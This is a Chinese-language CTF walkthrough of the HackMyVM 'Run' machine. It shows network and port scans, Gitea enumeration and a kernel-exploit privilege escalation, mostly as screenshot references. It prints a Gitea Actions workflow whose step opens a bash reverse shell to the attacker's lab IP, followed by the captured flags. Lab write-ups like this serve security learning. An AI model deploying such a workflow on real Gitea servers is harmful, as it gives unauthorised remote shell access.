---
title: hackmyvm Run靶机复盘
author: LingMj
data: 2025-02-09
categories: [hackmyvm]
tags: [gitea,les,docker,fscan]
description: 难度-Medium
---

## 网段扫描
```
root@LingMj:/home/lingmj/xxoo1# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:df:e2:a7, IPv4: 192.168.56.110
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:13       (Unknown: locally administered)
192.168.56.100  08:00:27:15:60:f4       PCS Systemtechnik GmbH
192.168.56.150  08:00:27:dc:bc:bb       PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.510 seconds (101.99 hosts/sec). 3 responded
```

## 端口扫描

```
root@LingMj:/home/lingmj/xxoo1# nmap -p- -sC -sV 192.168.56.150
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 07:10 EST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.150
Host is up (0.00092s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=de4ca6699fe36566; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=SY8B7yObey-q47ihXlqUtoTSJ0U6MTczOTEwMzA4MzM0MjQ0Nzg3OA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 09 Feb 2025 12:11:23 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovLzE5Mi4xNjguMS45OjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly8xOTIuMTY4LjEuOTozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXM
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=10c157a5d706bf2e; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=OM8v_dvEJpj33-LRUAvwyfYgzH86MTczOTEwMzA4ODgxNzM0MTM5Nw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 09 Feb 2025 12:11:28 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=2/9%Time=67A89B6C%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nCache-Contro
SF:l:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCon
SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gite
SF:a=de4ca6699fe36566;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cook
SF:ie:\x20_csrf=SY8B7yObey-q47ihXlqUtoTSJ0U6MTczOTEwMzA4MzM0MjQ0Nzg3OA;\x2
SF:0Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opti
SF:ons:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2009\x20Feb\x202025\x2012:11:23\x2
SF:0GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"them
SF:e-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=devi
SF:ce-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x2
SF:0cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:a
SF:pplication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRl
SF:YSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnR
SF:fdXJsIjoiaHR0cDovLzE5Mi4xNjguMS45OjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dH
SF:A6Ly8xOTIuMTY4LjEuOTozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ
SF:2UvcG5nIiwic2l6ZXM")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Met
SF:hod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20
SF:GET\r\nCache-Control:\x20max-age=0,\x20private,\x20must-revalidate,\x20
SF:no-transform\r\nSet-Cookie:\x20i_like_gitea=10c157a5d706bf2e;\x20Path=/
SF:;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=OM8v_dvEJpj33-LR
SF:UAvwyfYgzH86MTczOTEwMzA4ODgxNzM0MTM5Nw;\x20Path=/;\x20Max-Age=86400;\x2
SF:0HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x
SF:20Sun,\x2009\x20Feb\x202025\x2012:11:28\x20GMT\r\nContent-Length:\x200\
SF:r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request");
MAC Address: 08:00:27:DC:BC:BB (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.81 seconds
```

## 获取webshell
![图 0](../assets/images/803df1ee414b95e8d7d028ddc5660f4a178ea8716e7be801d5f0e31dc2f42a8c.png)  
![图 1](../assets/images/9471916aa882111fc64e4945be16b5dc99f34701365aaee4ce25d1f4e52f1644.png)  
![图 2](../assets/images/33ec446a3c3ce71a66ab80e81026704dfa5ee3ac24b11f2043f6c13cd7e45b63.png)  
![图 3](../assets/images/cc1bb6aef3b6a1463a2ee3a75ac7fb8364ace001928a783dd1f8019f15b262a6.png)  
![图 4](../assets/images/f2ff3a0474980bf862019f3dd823ebdafd847b6b217fe937d45c13b86ce94651.png)  

>默认密码也不对，扫目录了
>

![图 5](../assets/images/f6feb26103ae9838ccfd6bdbf96b0619112fe3e7d3a08f0ee9284b57ae6fa908.png)  
![图 6](../assets/images/48fe343032e3c33347ab81ba6c16358c36dcf682bc08b82c5f6759f17f5d9915.png)  
![图 7](../assets/images/74ef43a06f28e4ec3a433898fe544ee61c8deefa91e8b890b1698b2e184b96d3.png)  

>用户名应该是这个不是admin
>
![图 8](../assets/images/f1526e32604138263878f4516aaad21cb122bc8f20b582e164bd3b2f00b543a9.png)  
![图 9](../assets/images/489adf06cdfc3489d224d9bd4b1ad8ba32ecebc09e11cd986b3ded0f285f0460.png)  
![图 10](../assets/images/47bdf6c8d34da1e4e7e0baf3b03f0754ef68d73f371bd92cd6579dd60b5f1c4f.png)  
![图 11](../assets/images/c5747c9da0d4c039a6ea9eebfc862d6575648c7d012e92a78ac7deef6f5092b7.png)  
![图 12](../assets/images/a3cf7ba22c3632cd92a5b3ab45ac706aef43682fb10a2c7d605c77a39a1088ac.png)  
![图 13](../assets/images/4f860e255066e95b5c443c5ed361b4a6d8fae0caad347b1f85567fd76ddc51e8.png)  

>看完了无果不知道怎么拿
>
![图 14](../assets/images/9586a551ddfd6192c5bf8f5dbc4532b64aa85d185b731f750831b5de686f47a2.png)  
![图 15](../assets/images/d8e3993d6aee1cd5c8633b9a9e8248e382cf186cecb28c2615a5c1a403ee2970.png)  
![图 16](../assets/images/af382d362363d1a00fec817b5d9e3cc2f945f4b3e47fa08fa6d4b0f314794a1a.png)  

>只有jwt
>

![图 17](../assets/images/89169e7a0aa8956dde75c9df5584c5283134f3d6cee4bfcc641d7143937a4f0f.png)  

>记得之前有一个jwt的工具直接利用，git还是得用git的方式去解决差点错过
>
![图 18](../assets/images/b576a9f92e159d50370ea04aa5a9c12deb09552a639c5c20113da29910010f53.png)  
![图 19](../assets/images/5f0d0eb8d9be82ee4bdaa7fcb4c766ae90c5d9240f564c23c71511050356699b.png)  

>密码是这个,记得之前有一个靶机的reverseshell也是gitea看看能否一样利用
>

![图 20](../assets/images/48e9c0be8bdb862b188f50bdd0a7f83fa5d500249865fb82f6943bfb4c66d34c.png)  
![图 21](../assets/images/1a1bc0f04a04190fd4743c6d477ae712bd4d52db3d0dbf8955418504de503cdb.png)  
![图 22](../assets/images/074b7d096a266756e819cb6d9456e9f149b218eed3f86f483723e1440e6a9e82.png)  
![图 23](../assets/images/34bf63f8be4a1e950319bbab752865d46f2412d34e263d22d690670f0cc4274c.png)  

>没php，图片上传pass掉
>
![图 24](../assets/images/10681cb59fbf87bdc971410280aa3fdfb359c4d9db29a97941fcf9ac91feb139.png)  
![图 25](../assets/images/49578ef26becf81bfe08c3d40fdf4b067d26a6aa2163e9e517b059fd61ee2594.png)  

>不会了看wp了，这个研究了一段时间了还是不知道咋操作
>
![图 26](../assets/images/4a4812454134ecdc3d93aa2cfe05c005ddfe6f25504e5bf5776201ec6787f2a6.png)  

>学习一下
>
![图 27](../assets/images/b2088f418dc2c6c7e5ee8e4ff6160c510326cd568a6330cc0efea5544c9f01e0.png)  

>正常我的还是失败了，还是跟wp来把
>
![图 28](../assets/images/a198964887f10d62afd47213c9063ed1985b822cfd9ce9829bd5e66397cd1ec6.png)  

>没报错但是没成功,配置还是有问题
>
![图 29](../assets/images/5e91a56704690f804d49c4dbc9f55441b5734c5d6d6fb7113372ce4e590b6f19.png)  

>第二次还是失败
>
![图 30](../assets/images/e5edc4b7ce3869a2710e12efd837e1324e798fc01c6364bf36db85c83a5e064b.png)  

>ok，弹回来了，必须得开action和标签是run
>

```
root@LingMj:/home/lingmj/xxoo/reverseshell/.gitea/workflows# cat revershell.yaml 
on: [push]

jobs:
  revershell:
    runs-on: run
    steps:
      - run: /bin/bash -i >& /dev/tcp/192.168.56.110/1234 0>&1
```


## 提权
![图 31](../assets/images/c92daedc03534306e1bf083c40c4ad60d63051b1ec5ecfb2c60f310b903f5bd1.png)  

>首先他是一个docker，有私钥看一下
>
![图 32](../assets/images/7e1d56e9e34f4db48a7583b709cd0003eb7768ecaad94ebe6b9845b2c4bbeade.png)  

>把基本信息看一遍opt，var，home，root都没有东西只剩ip a 的docker地址他是4所以之前有1，2，3
>

![图 33](../assets/images/e2703bb44e673880a6a1d4d0ae289fcb5a05d5dd77851329a5901182d37ef7ea.png)  
![图 34](../assets/images/fb730c8d8b77de7d74739c86851ed5304664d8123bc581e849ce20c51b73891b.png)  
![图 35](../assets/images/9f648cf7fd0e8a3a886967f08e332bc26a82cbb4ccfb4d0d0fc8cde97ff7de02.png)  
![图 36](../assets/images/aec007efa3fc919046868c6a4f5121aa3c3fe18afd91ff544859054ffe6c2f53.png)  
![图 37](../assets/images/58ca11517ecaa2e91819ccd143e61796b3f20a0f328ce4262cbdeb793bad8660.png)  

>跑一下工具，不过跑完linpeas.sh没有东西，定时任务也没有
>
![图 38](../assets/images/8d5a6b270fb7ad3ffa672c71cffcbddedbca6e3974144e81d04d982e3fcf8995.png)  

>要么找密码，要么内核
>

![图 39](../assets/images/390200d0c82a20f4ece14b303aa881149fbd6956f67b2e9baa5b295d94f73de9.png)  
![图 40](../assets/images/ef0b7f043d6e2e99fb778afa4b36c7ae63bf880fc95c820d7491d1dae08fa7d9.png)  

>无果
>

![图 41](../assets/images/c4978738095a0db3c667c6348fb260a18e011942739be6ea8a743aaa8d7f8e63.png)  

>看看内核
>
![图 42](../assets/images/687297fc43cb283068e311d1708f456892a8c61eb37cbbc5c1f2d03ab825867f.png)  
![图 43](../assets/images/6dd0f98df611d7e338274c75188bdfe6036f44ae694716a52b2abe0fcccc0ead.png)  
![图 44](../assets/images/4385f1ee3a21d097f4144aaea1e95c59f0431e63109d56319850453f3413672a.png)  

>手动拉过来
>
![图 45](../assets/images/0e8d0e631c3cf4440f67adb8a1a8387572c692be7685f65c5e780c15aacc58fa.png)  

>就知道成功不了，看来跟pwnkit没关，看内核版本了
>

![图 46](../assets/images/b30b2b188e17f344a41f01c0f7f6ca0e955d2561471d4f6706e8ea01f8e2907d.png)  
![图 47](../assets/images/8a4a9dd884bf9b01816055023135adb6bf2e4392c1d201d9f0e5c72896b9b5c6.png)  
![图 48](../assets/images/1be9731628b8267fc6d752b40c697256ff56bb130b98b050e772c3b46d68690c.png)  
![图 49](../assets/images/cf154e19bb8520839dda98de8d30d0ab5dfd0602d82e93e0c1561e9ad16fcbf1.png)  

>牛逼奥这个脚本，到这里靶机就结束了，学习了一下gitea的reverse
>



>userflag:56f98bdfaf5186243bc4cb99f0674f58
>
>rootflag:008b138f906537f51a5a5c2c69c4b8a2
>
